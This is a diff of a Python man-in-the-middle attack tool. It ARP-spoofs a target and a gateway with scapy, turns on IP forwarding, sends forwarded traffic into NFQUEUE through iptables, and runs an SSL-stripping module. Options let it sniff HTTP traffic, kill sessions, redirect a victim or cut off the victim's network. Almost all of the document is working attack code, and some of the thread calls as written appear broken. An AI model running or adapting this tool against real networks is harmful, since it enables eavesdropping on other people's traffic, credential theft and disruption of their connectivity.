@@ -1,7 +1,7 @@
 import scapy.all as scapy
 from scapy.layers import http
-import subprocess
-#import netfilterqueue
+import os
+import netfilterqueue
 from strip import Strip
 from _thread import *
 import getopt
@@ -18,16 +18,16 @@ def parseOptions(argv):
     spoofFavicon = False
     killSessions = False
     redirect = ""
-    router_ip = "192.168.1.1"
-    target_ip = ""
+    routerIp = "192.168.1.1"
+    targetIp = ""
     iface = ""
-    cut = False
+    cutNet = False
     scan = ""
 
     try:
-        opts, args = getopt.getopt(argv, "hw:l:psafk",
+        opts, args = getopt.getopt(argv, "hw:l:t:r:g:i:psafkc",
                                    ["help", "write=", "post", "ssl", "all", "listen=",
-                                    "favicon", "killsessions", "target=", "redirect=", "interface", "scan="])
+                                    "favicon", "killsessions", "target-ip=", "redirect=", "iface=", "scan=", "cut-net", "gate="])
 
         for opt, arg in opts:
             if opt in ("-h", "--help"):
@@ -48,19 +48,22 @@ def parseOptions(argv):
             elif opt in ("-k", "--killsessions"):
                 killSessions = True
             elif opt in ("-t", "--target-ip"):
-                target_ip = arg
+                targetIp = arg
             elif opt in ("-r", "--redirect"):
                 redirect = True
             elif opt in ("-i", "--iface"):
                 iface = arg
             elif opt in ("-c", "--cut-net"):
-                cut = True
+                cutNet = True
             elif opt in ("--scan"):
                 scan = arg
-        return logFile, logLevel, listenPort, spoofFavicon, killSessions, target_ip, iface, redirect, router_ip, cut, scan
+            elif opt in ("-g", "--gate"):
+                routerIp = arg
+        return (logFile, logLevel, listenPort, spoofFavicon, killSessions, targetIp, iface, redirect, routerIp, cutNet, scan)
 
     except getopt.GetoptError:
         Strip().usage()
+        print()
         sys.exit(2)
 
 
@@ -69,11 +72,11 @@ def get_mac(ip):
     ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     packet = ether / arp
     ans = scapy.srp(packet, timeout=5, verbose=False)[0]
-    return str(ans[0][1].hwsrc)
+    ans1 = ans[0]
+    return ans1[1].hwsrc
 
 
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
+def spoof(target_ip, spoof_ip, target_mac):
     arp_spoof = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(arp_spoof, verbose=False)
 
@@ -121,40 +124,37 @@ def cut_net(packet):
 
 
 def enable_forward():
-    subprocess.call("echo '1' > /proc/sys/net/ipv4/ip_forward")
-    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0")
+    os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
+    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
 
 
 def final_spoof(target_ip, router_ip):
+    target_mac = get_mac(target_ip)
+    router_mac = get_mac(router_ip)
     while True:
-        spoof(target_ip, router_ip)
-        spoof(router_ip, target_ip)
+        spoof(target_ip, router_ip, target_mac)
+        spoof(router_ip, target_ip, router_mac)
         sleep(2)
 
 
 def main(argv):
-    (logFile, logLevel, listenPort, spoofFavicon, killSessions, target_ip, iface, redirect, router_ip, cut,
-     scan) = parseOptions(argv)
-    try:
-        if scan != "":
-            Scanner().run(scan)
-            sleep(2)
-            sys.exit()
-        else:
-            enable_forward()
-            start_new_thread(final_spoof(target_ip, router_ip))
-            start_new_thread(Strip().start(logFile, logLevel, listenPort, spoofFavicon, killSessions))
-            try:
-                if cut:
-                    queue(cut_net)
-                elif redirect:
-                    queue(redirect_process(redirect))
-                else:
-                    sniff(iface)
-            except Exception:
-                print("error1")
-    except Exception:
+    (logFile, logLevel, listenPort, spoofFavicon, killSessions, targetIp, iface, redirect, routerIp, cutNet, scan) = parseOptions(argv)
+    if scan != "":
+        Scanner().run(scan)
+        sleep(2)
         sys.exit()
+    else:
+        enable_forward()
+        start_new_thread(Strip().start(), (logFile, logLevel, listenPort, spoofFavicon, killSessions))
+        start_new_thread(final_spoof(), (routerIp, targetIp))
+        try:
+            if cutNet:
+                queue(cut_net)
+            elif redirect:
+                queue(redirect_process(redirect))
+            else:
+                sniff(iface)
+        except Exception:
+            print("error1")
 
 main(sys.argv[1:])
-
